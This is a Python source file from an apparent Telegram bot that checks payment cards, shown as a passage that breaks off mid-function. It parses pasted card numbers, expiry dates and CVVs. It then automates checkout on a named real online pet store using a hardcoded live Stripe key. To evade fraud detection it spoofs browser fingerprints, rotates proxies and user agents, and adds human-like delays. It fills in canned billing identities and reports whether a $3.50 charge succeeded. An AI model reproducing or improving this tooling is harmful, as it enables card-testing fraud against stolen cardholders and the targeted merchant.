# BOT/gates/charge/scharge3.py

import json
import asyncio
import re
import time
import httpx
import random
import string
import os
import ssl
import unicodedata
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import Message
import html

from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully")
except ImportError as e:
    print(f"❌ Proxy system import error: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    
    def mark_proxy_failed(proxy: str):
        pass

# Import smart card parser from filter.py
try:
    from BOT.helper.filter import extract_cards, normalize_year
    FILTER_AVAILABLE = True
    print("✅ Smart card parser imported successfully from filter.py")
except ImportError as e:
    print(f"❌ Filter import error: {e}")
    FILTER_AVAILABLE = False

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        pass

    def info(self, message):
        print(f"🔹 {message}", flush=True)

    def success(self, message):
        print(f"✅ {message}", flush=True)

    def warning(self, message):
        print(f"⚠️ {message}", flush=True)

    def error(self, message):
        print(f"❌ {message}", flush=True)

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}", flush=True)

    def network(self, message):
        print(f"🌐 {message}", flush=True)

    def card(self, message):
        print(f"💳 {message}", flush=True)

    def stripe(self, message):
        print(f"🔄 {message}", flush=True)

    def debug_response(self, message):
        print(f"🔧 {message}", flush=True)

    def bin_info(self, message):
        print(f"🏦 {message}", flush=True)

    def user(self, message):
        print(f"👤 {message}", flush=True)

    def proxy(self, message):
        print(f"🔗 {message}", flush=True)

# Create global logger instance
logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except Exception as e:
        logger.error(f"Failed to load owner ID: {e}")
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except Exception as e:
        logger.error(f"Failed to check banned users: {e}")
        return False

def check_cooldown(user_id, command_type="xs"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()

    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except Exception as e:
        logger.warning(f"Failed to load cooldowns: {e}")
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except Exception as e:
        logger.error(f"Failed to save cooldowns: {e}")

    return True, 0

# ========== INTELLIGENT CARD PARSING (Adapted from shopify054.py) ==========
def strip_all_unicode(text):
    """
    Remove ALL Unicode characters, keep only ASCII (letters, numbers, basic punctuation)
    """
    # Normalize unicode characters to ASCII where possible
    try:
        # First, try to normalize using NFKD form which decomposes unicode characters
        normalized = unicodedata.normalize('NFKD', text)
        # Then encode to ASCII, ignoring errors, and decode back
        ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    except:
        # Fallback: manually filter out non-ASCII characters
        ascii_text = ''.join(char for char in text if ord(char) < 128)
    
    # Keep only digits, letters, pipes, spaces, commas, slashes, and hyphens
    # This preserves card separators while removing decorative characters
    cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
    
    # Replace multiple spaces with single space
    cleaned = re.sub(r'\s+', ' ', cleaned)
    
    return cleaned.strip()

def extract_card_from_cleaned_text(text):
    """
    Extract card details from cleaned ASCII text
    """
    # Pattern 1: Standard format with pipe (cc|mm|yy|cvv)
    pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
    match = re.search(pattern1, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        # Normalize year
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    # Pattern 2: Space or comma separated (cc mm yy cvv) or (cc,mm,yy,cvv)
    pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
    match = re.search(pattern2, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    # Pattern 3: Find all digit sequences and try to find valid card
    digits = re.findall(r'\d+', text)
    
    # Try to find a valid card sequence
    for i in range(len(digits) - 3):
        potential_cc = digits[i]
        potential_mes = digits[i+1]
        potential_ano = digits[i+2]
        potential_cvv = digits[i+3]
        
        # Check if this looks like a valid card
        if (13 <= len(potential_cc) <= 16 and 
            len(potential_mes) in [1, 2] and 
            len(potential_ano) in [2, 4] and 
            len(potential_cvv) in [3, 4]):
            
            # Validate month
            try:
                mes_int = int(potential_mes)
                if 1 <= mes_int <= 12:
                    # Validate year (not too far in past/future)
                    current_year = datetime.now().year % 100
                    
                    # Handle 4-digit year
                    if len(potential_ano) == 4:
                        ano_val = int(potential_ano) % 100
                    else:
                        ano_val = int(potential_ano)
                    
                    # Year should be within reasonable range (current year to +10 years)
                    if current_year - 5 <= ano_val <= current_year + 10:
                        cc = potential_cc
                        mes = potential_mes.zfill(2)
                        ano = potential_ano[-2:]  # Always take last 2 digits
                        cvv = potential_cvv
                        return [cc, mes, ano, cvv]
            except:
                continue
    
    # Pattern 4: Look for card number followed by expiry and CVV with labels
    pattern4 = r'[Cc]ard:?\s*(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern4, text, re.IGNORECASE | re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    # Pattern 5: Generic pattern with slashes for dates
    pattern5 = r'(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern5, text, re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    return None

def parse_card_input(card_input):
    """
    Parse card input by first stripping ALL Unicode, then extracting card details
    """
    # Step 1: Strip all Unicode characters
    cleaned_text = strip_all_unicode(card_input)
    
    # Step 2: Extract card from cleaned text
    result = extract_card_from_cleaned_text(cleaned_text)
    if result:
        return result
    
    # Step 3: If still no result, try filter.py as fallback
    if FILTER_AVAILABLE:
        all_cards, unique_cards = extract_cards(card_input)  # Use original for filter
        if unique_cards:
            card_parts = unique_cards[0].split('|')
            if len(card_parts) == 4:
                cc, mes, ano, cvv = card_parts
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    # Step 4: Last resort - try direct split on original
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            mes = re.sub(r'\D', '', parts[1])
            ano = re.sub(r'\D', '', parts[2])
            cvv = re.sub(r'\D', '', parts[3])
            if cc and mes and ano and cvv:
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    return None

class StripeCharge3Checker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://finaticspetcenter.com"
        
        # Stripe keys from network data
        self.stripe_key = "pk_live_51Pb8AzJWvVkN4yp7zIV5r5aiv9cbGgr9urUElAjJknemdXaoGntmZuBWz63jobtRCrzp2KBUtEQ1ga69eIWu4INj00TDYcYDqa"
        self.stripe_account = "acct_1Pb8AzJWvVkN4yp7"
        
        # Product info from network data
        self.product_url = f"{self.base_url}/product/van-ness-pets-extra-small-open-cat-litter-box-kitten-rabbit-size-blue-cp0/"
        self.product_id = "988869"
        self.variation_id = "988870"
        
        # US address data (from network data)
        self.us_addresses = [
            {
                "first_name": "Billy",
                "last_name": "Mandy",
                "address": "8 log pond drive",
                "city": "Hosham",
                "postcode": "19044",
                "state": "PA",
                "phone": "2048200578",
                "email": "minipooch22@gmail.com"
            },
            {
                "first_name": "John",
                "last_name": "Smith",
                "address": "123 Main Street",
                "city": "New York",
                "postcode": "10001",
                "state": "NY",
                "phone": "2125551234",
                "email": "john.smith@gmail.com"
            },
            {
                "first_name": "Sarah",
                "last_name": "Johnson",
                "address": "456 Oak Avenue",
                "city": "Los Angeles",
                "postcode": "90001",
                "state": "CA",
                "phone": "3105555678",
                "email": "sarah.johnson@gmail.com"
            }
        ]

        # 3D Secure patterns
        self.secure_required_patterns = [
            r'requires_action',
            r'requires_confirmation',
            r'authentication_required',
            r'3ds',
            r'3d_secure',
            r'confirm-pi',
            r'pi_[a-zA-Z0-9]+_secret_',
        ]

        # User ID for proxy
        self.user_id = user_id
        
        # Proxy management
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False
        self.proxy_response_time = 0.0
        
        # Session storage
        self.cookies = {}
        self.checkout_nonce = None
        self.update_order_review_nonce = None
        self.woosw_key = None
        
        # httpx client
        self.client = None
        
        # Generate browser fingerprint
        self.generate_browser_fingerprint()

    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints"""
        self.screen_resolutions = [
            "1920x1080", "1366x768", "1536x864", "1440x900", "1280x720"
        ]
        self.timezones = [
            "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles"
        ]
        self.languages = [
            "en-GB,en-US;q=0.9,en;q=0.8", "en-US,en;q=0.9", "en;q=0.8"
        ]

        self.platform = "Win32"
        self.sec_ch_ua_platform = '"Windows"'
        
        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not:A-Brand";v="99", "Google Chrome";v="{version}", "Chromium";v="{version}"'
        else:
            self.sec_ch_ua = '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"'

        self.sec_ch_ua_mobile = "?0"
        self.screen_resolution = random.choice(self.screen_resolutions)
        self.timezone = random.choice(self.timezones)
        self.accept_language = random.choice(self.languages)

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get base headers mimicking browser"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent,
        }

    async def get_bin_info(self, cc):
        """Get BIN information with safe None handling"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}

            async with httpx.AsyncClient(timeout=10.0, verify=False, http1=True) as client:
                response = await client.get(url, headers=headers)

                if response.status_code == 200:
                    data = response.json()
                    country_code = data.get('country', 'N/A')
                    flag_emoji = self.get_country_emoji(country_code)

                    result = {
                        'scheme': str(data.get('brand', 'N/A')).upper() if data.get('brand') else 'N/A',
                        'type': str(data.get('type', 'N/A')).upper() if data.get('type') else 'N/A',
                        'brand': str(data.get('brand', 'N/A')).upper() if data.get('brand') else 'N/A',
                        'bank': str(data.get('bank', 'N/A')).upper() if data.get('bank') else 'N/A',
                        'country': str(data.get('country_name', country_code)).upper() if data.get('country_name') else country_code,
                        'country_code': country_code,
                        'emoji': flag_emoji
                    }
                    self.bin_cache[bin_number] = result
                    return result
        except Exception as e:
            logger.warning(f"BIN lookup failed: {e}")

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }
        self.bin_cache[bin_number] = default_response
        return default_response

    def trim_error_message(self, message):
        """Trim error message to remove unnecessary prefixes, suffixes, and trailing punctuation"""
        if not message:
            return message
        
        # Remove HTML tags first
        message = re.sub(r'<[^>]+>', '', message).strip()
        
        # Remove "Payment Failed" prefix variations
        message = re.sub(r'^Payment\s+Failed\s*\(?\s*', '', message, flags=re.IGNORECASE)
        message = re.sub(r'^Payment\s+Error\s*\(?\s*', '', message, flags=re.IGNORECASE)
        message = re.sub(r'^Error\s*:\s*', '', message, flags=re.IGNORECASE)
        message = re.sub(r'^There\s+was\s+an\s+error\s*:\s*', '', message, flags=re.IGNORECASE)
        
        # Remove "Refresh and try again" variations
        message = re.sub(r'\.?\s*Refresh\s+and\s+try\s+again\.?$', '', message, flags=re.IGNORECASE)
        message = re.sub(r'\.?\s*Please\s+try\s+again\.?$', '', message, flags=re.IGNORECASE)
        message = re.sub(r'\.?\s*Try\s+again\.?$', '', message, flags=re.IGNORECASE)
        
        # Remove trailing periods, spaces, and parentheses
        message = re.sub(r'\)\.?$', '', message)
        message = re.sub(r'\.$', '', message)
        message = message.rstrip('. )').strip()
        
        # Remove parentheses if they wrap the entire message
        if message.startswith('(') and message.endswith(')'):
            message = message[1:-1].strip()
        
        # Clean up any double spaces
        message = re.sub(r'\s+', ' ', message).strip()
        
        return message

    def extract_error_from_html(self, html_content):
        """Extract error message from HTML response and trim it"""
        if not html_content:
            return "Payment declined"
        
        # Pattern for woocommerce error
        pattern = r'<li>\s*There was an error processing the payment:\s*(.*?)\s*<\/li>'
        match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
        if match:
            error_text = match.group(1).strip()
            error_text = re.sub(r'<[^>]+>', '', error_text).strip()
            error_text = self.trim_error_message(error_text)
            return error_text
        
        # Alternative pattern
        pattern2 = r'woocommerce-error[^>]*>.*?<li>(.*?)<\/li>'
        match2 = re.search(pattern2, html_content, re.IGNORECASE | re.DOTALL)
        if match2:
            error_text = match2.group(1).strip()
            error_text = re.sub(r'<[^>]+>', '', error_text).strip()
            error_text = self.trim_error_message(error_text)
            return error_text
        
        return "Payment declined"

    def is_secure_required_response(self, response_data):
        """Check if the response indicates 3D Secure is required"""
        try:
            if isinstance(response_data, dict):
                redirect_url = response_data.get('redirect', '').lower()
                for pattern in self.secure_required_patterns:
                    if re.search(pattern, redirect_url):
                        return True
                if 'requires_action' in response_data or 'requires_confirmation' in response_data:
                    return True
                response_str = str(response_data).lower()
                if 'pi_' in response_str and '_secret_' in response_str:
                    return True
        except Exception as e:
            logger.warning(f"Error checking secure response: {e}")
        return False

    def extract_nonces_from_html(self, html_content):
        """Extract all required nonces from checkout page HTML"""
        nonces = {}
        
        # Extract woocommerce-process-checkout-nonce
        checkout_nonce_match = re.search(
            r'name="woocommerce-process-checkout-nonce"\s+value="([a-f0-9]{10})"',
            html_content
        )
        if checkout_nonce_match:
            nonces['checkout_nonce'] = checkout_nonce_match.group(1)
            logger.success(f"Extracted checkout nonce: {nonces['checkout_nonce']}")
        
        # Extract update_order_review nonce (security field)
        security_match = re.search(
            r'var\s+wc_checkout_params\s*=\s*\{[^}]*"update_order_review_nonce"\s*:\s*"([a-f0-9]{10})"',
            html_content
        )
        if security_match:
            nonces['update_order_review_nonce'] = security_match.group(1)
            logger.success(f"Extracted update_order_review nonce: {nonces['update_order_review_nonce']}")
        
        return nonces

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        """Format response matching scharge012.py style with trimmed message"""
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)
        
        safe_bin_info = {
            'scheme': str(bin_info.get('scheme', 'N/A')),
            'type': str(bin_info.get('type', 'N/A')),
            'brand': str(bin_info.get('brand', 'N/A')),
            'bank': str(bin_info.get('bank', 'N/A')) if bin_info.get('bank') else 'N/A',
            'country': str(bin_info.get('country', 'N/A')),
            'country_code': str(bin_info.get('country_code', 'N/A')),
            'emoji': str(bin_info.get('emoji', '🏳️'))
        }

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(str(user_data.get("first_name", "User")))
        badge = user_data.get("plan", {}).get("badge", "🧿")

        # Trim the message for display
        trimmed_message = self.trim_error_message(str(message)) if message else ""

        if any(pattern in trimmed_message.lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action"]):
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = "3D SECURE❎"
        elif status == "APPROVED":
            status_emoji = "✅"
            status_text = "APPROVED"
            message_display = "Successfully Charged $3.50"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = trimmed_message if trimmed_message else "Payment declined"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        
        bank_info = safe_bin_info['bank'].upper() if safe_bin_info['bank'] != 'N/A' else 'N/A'

        # FIX: Format elapsed_time safely
        try:
            time_str = f"{elapsed_time:.2f}"
        except (ValueError, TypeError):
            time_str = str(elapsed_time)

        response = f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge $3.50
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{safe_bin_info['scheme']} - {safe_bin_info['type']} - {safe_bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{safe_bin_info['country']}</code> [{safe_bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{time_str} 𝐬</code> |<b>P/x:</b> <code>{self.proxy_status}</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        """Get processing message matching scharge012.py style"""
        return f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge $3.50
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""

    async def human_delay(self, min_delay=0.5, max_delay=1.5):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)

    async def make_request_with_retry(self, method, url, max_retries=3, **kwargs):
        """Make request with retry logic for VPS compatibility"""
        last_exception = None
        
        for attempt in range(max_retries):
            try:
                if attempt > 0:
                    logger.warning(f"Retry attempt {attempt}/{max_retries} for {url}")
                    await asyncio.sleep(1.5 * attempt)
                
                headers = kwargs.get('headers', {}).copy()
                
                # Merge with base headers
                base_headers = self.get_base_headers()
                for key, value in base_headers.items():
                    if key not in headers:
                        headers[key] = value
                
                # Update dynamic headers
                headers['User-Agent'] = self.user_agent
                headers['Accept-Language'] = self.accept_language
                
                kwargs['headers'] = headers

                response = await self.client.request(method, url, **kwargs)
                
                # Store cookies from response
                if response.cookies:
                    for name, value in response.cookies.items():
                        self.cookies[name] = value
                
                return response
                
            except (httpx.ConnectError, httpx.NetworkError, httpx.ProtocolError) as e:
                last_exception = e
                logger.warning(f"Connection error on attempt {attempt + 1}: {str(e)}")
                if attempt < max_retries - 1:
                    continue
                else:
                    raise last_exception
            except httpx.TimeoutException as e:
                last_exception = e
                logger.warning(f"Timeout on attempt {attempt + 1}")
                if attempt < max_retries - 1:
                    continue
                else:
                    raise last_exception
        
        raise last_exception if last_exception else Exception("All retry attempts failed")

    async def initialize_session(self):
        """Initialize session with proper cookies"""
        try:
            logger.step(1, 7, "Initializing session...")

            response = await self.make_request_with_retry('GET', f"{self.base_url}/")

            if response.status_code == 200:
                # Store woosw_key from cookies
                for cookie_name, cookie_value in self.cookies.items():
                    if 'woosw_key' in cookie_name.lower():
                        self.woosw_key = cookie_value
                        logger.success(f"Found woosw_key: {self.woosw_key}")
                
                logger.success("Session initialized successfully")
                return True
            else:
                logger.error(f"Failed with status {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Session initialization error: {str(e)}")
            return False

    async def get_woosw_button(self):
        """Get wishlist button data"""
        try:
            logger.step(2, 7, "Getting wishlist data...")
            
            payload = {
                'action': 'vamtam_get_woosw_button',
                'id': self.product_id
            }
            
            headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "Origin": self.base_url,
                "Referer": self.product_url,
                "X-Requested-With": "XMLHttpRequest"
            }
            
            response = await self.make_request_with_retry('POST', f"{self.base_url}/wp-admin/admin-ajax.php", headers=headers, data=payload)
            
            if response.status_code == 200:
                logger.success("Wishlist data retrieved")
                return True
            else:
                logger.warning(f"Wishlist request failed: {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"Wishlist error: {str(e)}")
            return False

    async def select_variation(self):
        """Select product variation (small size)"""
        try:
            logger.step(3, 7, "Selecting product variation...")
            
            # First, ensure we're on the product page
            response = await self.make_request_with_retry('GET', self.product_url)
            
            if response.status_code not in [200, 202]:
                return False, f"Failed to load product page: {response.status_code}"
            
            # Get woosw button first
            await self.get_woosw_button()
            
            # Select small size via AJAX
            payload = {
                'action': 'vamtam_get_woosw_button',
                'id': self.product_id
            }
            
            # Add variation selection
            variation_payload = {
                'product_id': self.product_id,
                'is_variable': 'true',
                'attribute_pa_size': 'small',
                'quantity': '1',
                'variation_id': self.variation_id,
                'product_sku': '',
                'action': 'woocommerce_ajax_add_to_cart'
            }
            
            headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": self.base_url,
                "Referer": self.product_url,
                "X-Requested-With": "XMLHttpRequest"
            }
            
            response = await self.make_request_with_retry('POST', f"{self.base_url}/wp-admin/admin-ajax.php", headers=headers, data=variation_payload)
            
            if response.status_code == 200:
                logger.success("Product variation selected and added to cart")
                return True, None
            else:
                return False, f"Failed to add to cart: {response.status_code}"
                
        except Exception as e:
            logger.error(f"Variation selection error: {str(e)}")
            return False, f"Variation selection error: {str(e)}"

    async def get_checkout_page(self):
        """Load checkout page and extract nonces"""
        try:
            logger.step(4, 7, "Loading checkout page...")

            response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/")

            if response.status_code != 200:
                return False, f"Failed to load checkout page: {response.status_code}"

            html_content = response.text
            
            # Extract all nonces
            nonces = self.extract_nonces_from_html(html_content)
            
            if 'checkout_nonce' in nonces:
                self.checkout_nonce = nonces['checkout_nonce']
            
            if 'update_order_review_nonce' in nonces:
                self.update_order_review_nonce = nonces['update_order_review_nonce']
            
            logger.success(f"Checkout page loaded - Checkout nonce: {self.checkout_nonce}, Update nonce: {self.update_order_review_nonce}")
            return True, None

        except Exception as e:
            logger.error(f"Checkout page error: {str(e)}")
            return False, f"Checkout page error: {str(e)}"

    async def update_order_review(self, user_info):
        """Update order review with US address"""
        try:
            logger.step(5, 7, "Updating order review...")
            
            if not self.update_order_review_nonce:
                logger.warning("Missing update_order_review_nonce, attempting to get from checkout page")
                success, error = await self.get_checkout_page()
                if not success:
                    return False, f"Failed to get checkout page: {error}"

            # Build post_data as in network data
            current_time = datetime.now()
            session_start = current_time.strftime('%Y-%m-%d %H:%M:%S')
            
            # URL encode the user agent
            user_agent_encoded = self.user_agent.replace(' ', '%20')
            
            post_data = {
                'wc-ajax': 'update_order_review',
                'security': self.update_order_review_nonce,
                'payment_method': 'stripe_cc',
                'country': 'US',
                'state': user_info['state'],
                'postcode': user_info['postcode'],
                'city': user_info['city'],
                'address': user_info['address'],
                'address_2': '',
                's_country': 'US',
                's_state': user_info['state'],
                's_postcode': user_info['postcode'],
                's_city': user_info['city'],
                's_address': user_info['address'],
                's_address_2': '',
                'has_full_address': 'true',
                'post_data': (
                    f"wc_order_attribution_source_type=typein&"
                    f"wc_order_attribution_referrer=(none)&"
                    f"wc_order_attribution_utm_campaign=(none)&"
                    f"wc_order_attribution_utm_source=(direct)&"
                    f"wc_order_attribution_utm_medium=(none)&"
                    f"wc_order_attribution_utm_content=(none)&"
                    f"wc_order_attribution_utm_id=(none)&"
                    f"wc_order_attribution_utm_term=(none)&"
                    f"wc_order_attribution_utm_source_platform=(none)&"
                    f"wc_order_attribution_utm_creative_format=(none)&"
                    f"wc_order_attribution_utm_marketing_tactic=(none)&"
                    f"wc_order_attribution_session_entry=https%3A%2F%2Ffinaticspetcenter.com%2Fmy-account%2F&"
                    f"wc_order_attribution_session_start_time={session_start.replace(' ', '%20')}&"
                    f"wc_order_attribution_session_pages=11&"
                    f"wc_order_attribution_session_count=1&"
                    f"wc_order_attribution_user_agent={user_agent_encoded}&"
                    f"billing_first_name={user_info['first_name']}&"
                    f"billing_last_name={user_info['last_name']}&"
                    f"billing_company=&"
                    f"billing_country=US&"
                    f"billing_address_1={user_info['address'].replace(' ', '%20')}&"
                    f"billing_address_2=&"
                    f"billing_city={user_info['city']}&"
                    f"billing_state={user_info['state']}&"
                    f"billing_postcode={user_info['postcode']}&"
                    f"billing_phone={user_info['phone']}&"
                    f"billing_email={user_info['email'].replace('@', '%40')}&"
                    f"order_comments=&"
                    f"coupon_code=&"
                    f"payment_method=stripe_cc&"
                    f"stripe_cc_token_key=&"
                    f"stripe_cc_payment_intent_key=&"
                    f"terms=on&"
                    f"terms-field=1&"
                    f"woocommerce-process-checkout-nonce={self.checkout_nonce or ''}&"
                    f"_wp_http_referer=https%3A%2F%2Ffinaticspetcenter.com%2Fcheckout%2F"
                )
            }

            update_headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
